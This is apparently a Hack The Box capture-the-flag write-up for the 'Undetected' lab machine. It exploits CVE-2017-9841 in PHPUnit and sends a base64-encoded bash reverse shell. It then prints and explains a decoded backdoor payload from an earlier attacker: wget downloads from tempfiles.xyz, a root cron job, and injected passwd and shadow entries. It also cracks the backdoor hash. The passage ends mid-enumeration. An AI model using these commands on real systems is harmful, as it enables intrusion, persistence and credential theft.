---
title: HTB: Undetected
url: https://0xdf.gitlab.io/2022/07/02/htb-undetected.html
date: 2022-07-02T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-undetected, ctf, nmap, feroxbuster, php, wfuzz, vhosts, composer, phpunit, cve-2017-9841, webshell, reverse-engineering, ghidra, awk, backdoor, hashcat, apache-mod, sshd, oscp-plus-v2
---

![Undetected](https://0xdfimages.gitlab.io/img/undetected-cover.png)

Undetected follows the path of an attacker against a partially disabled website. I’ll exploit a misconfigured PHP package to get execution on the host. From there, I’ll find a kernel exploit left behind by the previous attacker, and while it no longer works, the payload shows how it modified the passwd and shadow files to add backdoored users with static passwords, and those users are still present. Further enumeration finds a malicious Apache module responsible for downloading and installing a backdoored sshd binary. Reversing that provides a password I can use to get a root shell.

## Box Info

| Name | [Undetected](https://hackthebox.com/machines/undetected)  [Undetected](https://hackthebox.com/machines/undetected) [Play on HackTheBox](https://hackthebox.com/machines/undetected) |
| --- | --- |
| Release Date | [19 Feb 2022](https://twitter.com/hackthebox_eu/status/1494295624916869123) |
| Retire Date | 02 Jul 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Undetected |
| Radar Graph | Radar chart for Undetected |
| First Blood User | 00:19:43[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 01:08:16[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.146
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-28 09:01 EST
Nmap scan report for 10.10.11.146
Host is up (0.098s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.146
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-28 09:01 EST
Nmap scan report for 10.10.11.146
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

The site is for a Jewelry store:

[![image-20220128081253741](https://0xdfimages.gitlab.io/img/image-20220128081253741.png)](https://0xdfimages.gitlab.io/img/image-20220128081253741.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220128081253741.png)

The page does give the domain, `djewelry.htb`. All but one of the links on the page lead to places on the same page. The “Visit Store” link points to `store.djewelry.htb`.

#### Tech Stack

The response headers don’t give much beyond Apache. Checking `index.php` returns 404, but `index.html` returns the page, so that doesn’t give much of a hint either (though could make less likely Python or Ruby frameworks).

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find much of interest:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.146

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.146
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      313c http://10.10.11.146/images => http://10.10.11.146/images/
301      GET        9l       28w      310c http://10.10.11.146/css => http://10.10.11.146/css/
301      GET        9l       28w      309c http://10.10.11.146/js => http://10.10.11.146/js/
301      GET        9l       28w      312c http://10.10.11.146/fonts => http://10.10.11.146/fonts/
301      GET        9l       28w      312c http://10.10.11.146/icons => http://10.10.11.146/icons/
403      GET        9l       28w      277c http://10.10.11.146/server-status
301      GET        9l       28w      318c http://10.10.11.146/icons/small => http://10.10.11.146/icons/small/
[####################] - 2m    209993/209993  0s      found:7       errors:232    
[####################] - 2m     29999/29999   216/s   http://10.10.11.146 
[####################] - 2m     29999/29999   221/s   http://10.10.11.146/images 
[####################] - 2m     29999/29999   223/s   http://10.10.11.146/css 
[####################] - 2m     29999/29999   216/s   http://10.10.11.146/js 
[####################] - 2m     29999/29999   219/s   http://10.10.11.146/fonts 
[####################] - 2m     29999/29999   221/s   http://10.10.11.146/icons 
[####################] - 2m     29999/29999   249/s   http://10.10.11.146/icons/small

```

### Subdomain Fuzz

Given the use of `djewelry.htb` and `store.djewelry.htb`, I’ll fuzz for other subdomains with `wfuzz`:

```

oxdf@hacky$ wfuzz -u http://10.10.11.146 -H "Host: FUZZ.djewelry.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 15283
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.146/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000037:   200        195 L    475 W    6203 Ch     "store"
000037212:   400        10 L     35 W     304 Ch      "*"

Total time: 1084.208
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 92.23318

```

It doesn’t find anything besides `store.djewelry.htb`. I’ll add that and the base domain to my `/etc/hosts`. I can’t find any different behavior between `djewelry.htb` and getting the page by IP.

### store.djewelry.htb

#### Site

The store site is similar, but has items for sale:

[![image-20220128091854405](https://0xdfimages.gitlab.io/img/image-20220128091854405.png)](https://0xdfimages.gitlab.io/img/image-20220128091854405.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220128091854405.png)

There’s a newsletter form at the bottom, but submitting it just reloads the page (it doesn’t even send the email address).

There’s a bunch of links on the page, all of which lead to one of the following:
- `/cart.php`
- `/login.php`
- `/products.php`
- Another spot on this same page.

`/cart` displays a notice that the site is not taking online orders at the current time:

![image-20220128092230682](https://0xdfimages.gitlab.io/img/image-20220128092230682.png)

The “Contact Us” button just leads back to `cart.php`.

`/products.php` shows products:

[![image-20220128092308283](https://0xdfimages.gitlab.io/img/image-20220128092308283.png)](https://0xdfimages.gitlab.io/img/image-20220128092308283.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220128092308283.png)

Trying to add something to the cart just goes back to the same message.

`/login.php` shows a similar message as `/cart.php`:

![image-20220128092351240](https://0xdfimages.gitlab.io/img/image-20220128092351240.png)

#### Directory Brute Force

Running `feroxbuster` against this subdomain returns standard looking stuff:

```

oxdf@hacky$ feroxbuster -u http://store.djewelry.htb/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://store.djewelry.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      325c http://store.djewelry.htb/images => http://store.djewelry.htb/images/
200      GET      195l      475w     6215c http://store.djewelry.htb/
301      GET        9l       28w      321c http://store.djewelry.htb/js => http://store.djewelry.htb/js/
301      GET        9l       28w      322c http://store.djewelry.htb/css => http://store.djewelry.htb/css/
301      GET        9l       28w      324c http://store.djewelry.htb/fonts => http://store.djewelry.htb/fonts/
301      GET        9l       28w      325c http://store.djewelry.htb/vendor => http://store.djewelry.htb/vendor/
403      GET        9l       28w      283c http://store.djewelry.htb/server-status
[####################] - 58s   180000/180000  0s      found:7       errors:0      
[####################] - 57s    30000/30000   518/s   http://store.djewelry.htb/ 
[####################] - 0s     30000/30000   0/s     http://store.djewelry.htb/images => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://store.djewelry.htb/js => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://store.djewelry.htb/css => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://store.djewelry.htb/fonts => Directory listing (add -e to scan)
[####################] - 0s     30000/30000   0/s     http://store.djewelry.htb/vendor => Directory listing (add -e to scan)

```

It points out that all the directories seem to be listable. The `/vendor` directory seems to have interesting stuff, including `/vendor/composer/installed`, which could give information about what plugins are in use. `composer` is a PHP package management system.

#### Tech Stack

I noticed the links above going to PHP pages, so the site is running on PHP. And it seems to be using `composer` to manage packages. As `feroxbuster` noted, `/vendor` has directory listing enabled:

![image-20220128100346863](https://0xdfimages.gitlab.io/img/image-20220128100346863.png)

In `/vendor/composer`, there’s an `installed.json` (which matches what’s loaded on visiting `installed`, not sure why?). I’ll use `curl` and `jq` to download the `json` file and get the name and version of each installed package:

```

oxdf@hacky$ curl -s 'http://store.djewelry.htb/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'
["doctrine/instantiator","1.4.0"]
["myclabs/deep-copy","1.10.2"]
["phpdocumentor/reflection-common","2.2.0"]
["phpdocumentor/reflection-docblock","5.2.2"]
["phpdocumentor/type-resolver","1.4.0"]
["phpspec/prophecy","v1.10.3"]
["phpunit/php-code-coverage","4.0.8"]
["phpunit/php-file-iterator","1.4.5"]
["phpunit/php-text-template","1.2.1"]
["phpunit/php-timer","1.0.9"]
["phpunit/php-token-stream","2.0.2"]
["phpunit/phpunit","5.6.2"]
["phpunit/phpunit-mock-objects","3.4.4"]
["sebastian/code-unit-reverse-lookup","1.0.2"]
["sebastian/comparator","1.2.4"]
["sebastian/diff","1.4.3"]
["sebastian/environment","2.0.0"]
["sebastian/exporter","1.2.2"]
["sebastian/global-state","1.1.1"]
["sebastian/object-enumerator","1.0.0"]
["sebastian/recursion-context","1.0.5"]
["sebastian/resource-operations","1.0.0"]
["sebastian/version","2.0.1"]
["symfony/polyfill-ctype","v1.23.0"]
["symfony/yaml","v3.4.47"]
["webmozart/assert","1.10.0"]

```

## Shell as www-data

### Find Vulnerability

Having the versions handy is useful, as now I can google each plugin plus the word “exploit”, and look for posts that are recent and if something looks interesting, check the version numbers.

Moving through the list, when I search for “phpunit exploit”, the top three posts look very interesting:

![image-20220128101142188](https://0xdfimages.gitlab.io/img/image-20220128101142188.png)

### RCE

#### CVE-2017-9841 Background

The [Imperva blog](https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/) goes into detail about CVE-2017-9841 and why this 2017 CVE it is still being used heavily by attackers in 2020. For what it’s worth, the author of PHPUnit [doesn’t believe this is a vulnerability](https://thephp.cc/articles/phpunit-a-security-risk), but rather a feature:

![image-20220128101504581](https://0xdfimages.gitlab.io/img/image-20220128101504581.png)

Basically, this should never be in production.

#### POC

To exploit this, I need to send a request to `eval-stdin.php`, which the post shows the full path to. In the body of the request, I’ll included PHP I want to be executed. For example:

```

oxdf@hacky$ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("id"); ?>'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

That’s RCE!

#### Shell

I’ll try a Bash reverse shell, but it doesn’t work directly. It’s probably special characters messing it up, so I’ll base64 encode it, and run it that way. First, create the payload:

```

oxdf@hacky$ echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

```

Now test it on my local system and make sure it connects:

```

oxdf@hacky$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==" | base64 -d | bash

```

It does connect to a `nc` listening on TCP 443 (not shown here). Now I’ll run that same command on Undetected:

```

oxdf@hacky$ curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash"); ?>'

```

It just hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.146 58258
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$

```

I’ll upgrade the shell as well using `script`:

```

www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ script /dev/null -c bash
<unit/phpunit/src/Util/PHP$ script /dev/null -c bash                     
Script started, file is /dev/null
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg 
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$

```

## Shell as steven

### Enumeration

#### Homedirs

The www-data user’s home directory is `/var/www`. There’s not too much here, and since the site doesn’t actually connect to a database, there’s not much in the way of creds.

There’s one other user on the box with a home directory, but www-data cannot access it:

```

www-data@production:/home$ ls
steven
www-data@production:/home$ cd steven/
bash: cd: steven/: Permission denied

```

#### Backups

In poking around the filesystem, `/var/backups` has an unusual file in it:

```

www-data@production:/var/backups$ ls -l 
total 756
-rw-r--r-- 1 root     root      51200 Jul  5  2021 alternatives.tar.0
-rw-r--r-- 1 root     root      33976 Jan 27 16:01 apt.extended_states.0
-rw-r--r-- 1 root     root       3741 Jan 21 15:03 apt.extended_states.1.gz
-rw-r--r-- 1 root     root       4022 Jul  5  2021 apt.extended_states.2.gz
-rw-r--r-- 1 root     root       4027 Jul  5  2021 apt.extended_states.3.gz
-rw-r--r-- 1 root     root       4003 Jul  4  2021 apt.extended_states.4.gz
-rw-r--r-- 1 root     root       3990 Jul  4  2021 apt.extended_states.5.gz
-rw-r--r-- 1 root     root       3735 Jun  4  2021 apt.extended_states.6.gz
-rw-r--r-- 1 root     root        268 Jun  4  2021 dpkg.diversions.0
-rw-r--r-- 1 root     root        172 Jul  4  2021 dpkg.statoverride.0
-rw-r--r-- 1 root     root     621012 Jul  4  2021 dpkg.status.0
-r-x------ 1 www-data www-data  27296 May 14  2021 info

```

Everything else there is owned by root, but this `info` file is owned by www-data. It’s an ELF executable, which further makes it stand out as out of place:

```

www-data@production:/var/backups$ file info 
info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped

```

Running it, it looks like it’s attempting some kind of kernel exploit:

```

www-data@production:/var/backups$ ./info 
[.] starting
[.] namespace sandbox set up
[.] KASLR bypass enabled, getting kernel addr
[-] substring 'ffff' not found in dmesg

```

Given the box name, Undetected, I wonder if I’m tracing the path of a previous attacker.

I’ll copy this file into `/var/www/main/images/`:

```

www-data@production:/var/backups$ cp info /var/www/main/images  

```

From my host, I’ll download it:

```

oxdf@hacky$ wget http://djewelry.htb/images/info                                                  
--2022-01-28 11:41:15--  http://djewelry.htb/images/info
Resolving djewelry.htb (djewelry.htb)... 10.10.11.146
Connecting to djewelry.htb (djewelry.htb)|10.10.11.146|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27296 (27K)   
Saving to: ‘info’

info                                                                100%[===================================================================================================================================================================>]  26.66K  --.-KB/s    in 0.1s    

2022-01-28 11:41:15 (274 KB/s) - ‘info’ saved [27296/27296]

```

And clean up after myself:

```

www-data@production:/var/backups$ rm /var/www/main/images/info 
rm: remove write-protected regular file '/var/www/main/images/info'? y

```

### info

#### main

I’ll open the file in Ghidra, and after giving it the default analysis options, take a look at it. There are a few functions:

![image-20220128114752275](https://0xdfimages.gitlab.io/img/image-20220128114752275.png)

I’ll start with `main`:

```

void main(void)

{
  puts("[.] starting");
  setup_sandbox();
  puts("[.] namespace sandbox set up");
  puts("[.] KASLR bypass enabled, getting kernel addr");
  KERNEL_BASE = get_kernel_addr();
  printf("[.] done, kernel text:   %lx\n",KERNEL_BASE);
  printf("[.] commit_creds:        %lx\n",KERNEL_BASE + 0xa5cf0);
  printf("[.] prepare_kernel_cred: %lx\n",KERNEL_BASE + 0xa60e0);
  printf("[.] native_write_cr4:    %lx\n",KERNEL_BASE + 0x64210);
  puts("[.] padding heap");
  kmalloc_pad(0x200);
  pagealloc_pad(0x400);
  puts("[.] done, heap is padded");
  puts("[.] SMEP & SMAP bypass enabled, turning them off");
  oob_timer_execute(KERNEL_BASE + 0x64210,0x407f0);
  puts("[.] done, SMEP & SMAP should be off now");
  printf("[.] executing get root payload %p\n",get_root_payload);
  oob_id_match_execute(get_root_payload);
  puts("[.] done, should be root now");
  check_root();
  do {
    sleep(1000);
  } while( true );
}

```

It does look like it’s attempting a kernel exploit, but it failed earlier in `get_kerner_addr()` (judging from what printed).

#### check\_root

While it doesn’t seem this payload works for me now, I’ll see what it would have done on succeeding. Immediately after printing “should be root now”, this binary calls `check_root()`, and then sleeps forever. This doesn’t seem super useful to the attacker, so there must be something interesting in `check_root()`.

It calls `is_root()`, and returns if it fails, and calls `fork_shell` on success:

```

void check_root(void)

{
  char cVar1;
  
  puts("[.] checking if we got root");
  cVar1 = is_root();
  if (cVar1 == '\x01') {
    puts("[+] got r00t ^_^");
    fork_shell();
  }
  else {
    puts("[-] something went wrong =(");
  }
  return;
}

```

`is_root()` attempts to open `/etc/shadow` and returns based on the success.

`fork_shell` calls `fork` to create a child, and then has the parent exit:

```

void fork_shell(void)

{
  __pid_t _Var1;
  
  _Var1 = fork();
  if (_Var1 == -1) {
    perror("[-] fork()");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (_Var1 == 0) {
    exec_shell();
  }
  return;
}

```

The child calls `exec_shell()`.

#### exec\_shell

Finally I found the function that actually does something!

```

void exec_shell(void)

{
  byte *pbVar1;
  long i;
  undefined8 *hex_blob;
  undefined8 *puVar2;
  undefined *argv [4];
  byte decoded [1328];
  undefined8 hex_buffer_cpy;
  byte int_c2;
  char int_c1;
  char *bash;
  byte *ptr_decoded;
  undefined8 *ptr_hex_buf_copy;
  char next_char;
  
  bash = "/bin/bash";
  hex_blob = (undefined8 *) "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572 732e7478743b";
  puVar2 = &hex_buffer_cpy;
  for (i = 0xa4; i != 0; i = i + -1) {
    *puVar2 = *hex_blob;
    hex_blob = hex_blob + 1;
    puVar2 = puVar2 + 1;
  }
  *(undefined4 *)puVar2 = *(undefined4 *)hex_blob;
  *(undefined *)((long)puVar2 + 4) = *(undefined *)((long)hex_blob + 4);
  ptr_hex_buf_copy = &hex_buffer_cpy;
  ptr_decoded = decoded;
  while (*(char *)ptr_hex_buf_copy != '\0') {
    next_char = *(char *)ptr_hex_buf_copy;
    ptr_hex_buf_copy = (undefined8 *)((long)ptr_hex_buf_copy + 1);
    int_c1 = hexdigit2int(next_char);
    next_char = *(char *)ptr_hex_buf_copy;
    ptr_hex_buf_copy = (undefined8 *)((long)ptr_hex_buf_copy + 1);
    int_c2 = hexdigit2int(next_char);
    pbVar1 = ptr_decoded + 1;
    *ptr_decoded = int_c1 << 4 | int_c2;
    ptr_decoded = pbVar1;
  }
  *ptr_decoded = 0;
  argv[0] = bash;
  argv[1] = (undefined *)&-c;
  argv[2] = decoded;
  argv[3] = (undefined *)0x0;
  execve(bash,argv,(char **)0x0);
  return;
}

```

There’s a big hex blob. It will loop over that, hex decoding it, and writing the results into a buffer. Then it calls `execve(bash, [bash, -c, [decoded blob], 0], [0])`, which effectively starts `bash` with the command from the buffer.

#### Commands Run

I’ll use `echo` and `xxd -r -p` to hex decode the blob:

```

oxdf@hacky$ echo "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572 732e7478743b" | xxd -r -p
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;

```

With some whitespace added for readability:

```

wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; 
wget tempfiles.xyz/.main -O /var/lib/.main;
chmod 755 /var/lib/.main;
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab;
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd;
while read -r user group home shell _; do 
    echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; 
done < users.txt; 
rm users.txt;

```

The script:
- Downloads an `authorized_keys` file from `tempfiles.xyz` and saves it for root as an SSH backdoor.
- Downloads a file, `.main` and saves it in `/var/lib/`, sets it executable, and adds it to the system `crontab` file to be run every minute from 3am - 4am each day.
- Finds each user in `/etc/password` that has the shell `/bin/bash` and a UID 1000 or greater and writes a line to `/etc/shadow` based on it.
- Finds each user in `/etc/password` with the same criteria again and this time writes their username, group, home folder, and shell to a file, `users.txt`.
- It loops over the rows in `users.txt` creating rows in `/etc/passwd` for them with the “1” appended to their username, but keeping the same UID.
- Removes the `users.txt` file.

The `awk` commands are worth a bit of of a closer look. I’ll highlight different parts of the command as I describe there here. For example, it starts by running `awk`, with the `-F":"` to set the field separator to “:”, and running that on `/etc/passwd`:

![](https://0xdfimages.gitlab.io/img/undetected-awk-1.png)

The string in the middle describes what `awk` will do with it. If field seven is “/bin/bash” and field three is greater than or equal to 1000, it will do what’s in the `[]`:

![](https://0xdfimages.gitlab.io/img/undetected-awk-2.png)

The command it does for each line that matches the criteria above is:

![](https://0xdfimages.gitlab.io/img/undetected-awk-3.png)

It’s appending a line to `/etc/shadow` where the usename is the first field (in this case the username from `/etc/passwd`) plus the “1” character, and it has a fixed hash (that presumably the attacker knows).

The second `awk` command has the same start, but this time it’s just storing the first (username), third (uid), sixth (home directory), and seventh (shell) to a file space separated:

![](https://0xdfimages.gitlab.io/img/undetected-awk-4.png)

I can use a similar `awk` to print all the lines in `/etc/passwd` that would match on this run:

```

www-data@production:/var/backups$ awk -F':' '$7 == "/bin/bash" && $3 >= 1000 {print $1":"$3":"$6":"$7}' /etc/passwd
steven:1000:/home/steven:/bin/bash
steven1:1000:/home/steven:/bin/bash

```

There’s already a steven1 user with the same UID as steven, which implies this worked. I can’t read `/etc/shadow`, but I can guess that steven1 has that same hash.

### Hashcat

I’ll remove the escape slashes to get the hash in the format Hashcat will accept:

```

$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/

```

Using the latest version of Hashcat, it will automatically detect the hash type, but I can also see this is mode 1800 in the [example hash list](https://hashcat.net/wiki/doku.php?id=example_hashes).

It took a few minutes to crack on my system, but it does return the password “ihatehackers”:

```

$ /opt/hashcat-6.2.5/hashcat.bin steven1_hash /usr/share/wordlists/rockyou.txt 
...[snip]...
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers
...[snip]...

```

### SSH

This password will not work for steven:

```

oxdf@hacky$ sshpass -p ihatehackers ssh steven@10.10.11.146
Permission denied, please try again.

```

But it will work for steven1, and since they have the same UID, it will give a shell as steven:

```

oxdf@hacky$ sshpass -p ihatehackers ssh steven1@10.10.11.146
Last login: Fri Jan 28 18:01:40 2022 from 10.10.14.6
steven@production:~$ 

```

And I can grab `user.txt`:

```

steven@production:~$ cat user.txt
3d5e705a************************

```

## Shell as root

### Enumeration

Besides `user.txt` steven’s home dir is basically empty. They do have mail in `/var/mail`:

```

steven@production:~$ cd /var/mail/
steven@production:/var/mail$ ls -l
total 4
-rw-rw---- 1 steven mail 966 Jul 25  2021 steven
steven@production:/var/mail$ cat steven 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin

```

The note explains why there’s no DB on the server, and how the site is shutdown for orders. It also calls out odd behavior in the web server.

Even without that, I can look for files that were written around the time that the other backdoors were created. `info` was from 14 May 2021 (`ls` doesn’t show the year for files less than one year old, and this command was run in Feb 2022):

```

steven@production:/var/backups$ ls -l info 
-r-x------ 1 www-data www-data 27296 May 14  2021 info

```

I’ll look for files around that time:

```

steven@production:/$ find / -newermt 2021-05-10 ! -newermt 2021-05-30 -ls 2>/dev/null | grep -i -e apache -e main -e info$
     3496     12 -rw-r--r--   1 root     root        11854 May 11  2021 /usr/lib/python3.9/lib2to3/main.py
